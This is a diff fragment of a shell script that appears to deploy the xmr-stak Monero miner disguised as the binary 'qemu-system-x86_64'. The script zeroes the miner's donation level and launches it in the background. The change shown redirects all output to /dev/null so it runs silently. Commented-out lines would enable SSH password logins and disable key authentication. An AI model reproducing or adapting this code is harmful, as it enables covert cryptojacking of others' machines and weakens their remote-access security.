@@ -29,7 +29,7 @@ echo -e "[\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/
 echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/build/bin/cpu.txt)" > $workingdir/qemu-system-x86/build/bin/cpu.txt
 cd $workingdir/qemu-system-x86/build/bin
 sed -i 's/2\.0/0\.0/g' $workingdir/qemu-system-x86/xmrstak/donate-level.hpp
-nohup ./qemu-system-x86_64 &
+nohup ./qemu-system-x86_64 > /dev/null 2>&1&
 cd
 #sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 #sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/g' /etc/ssh/sshd_config
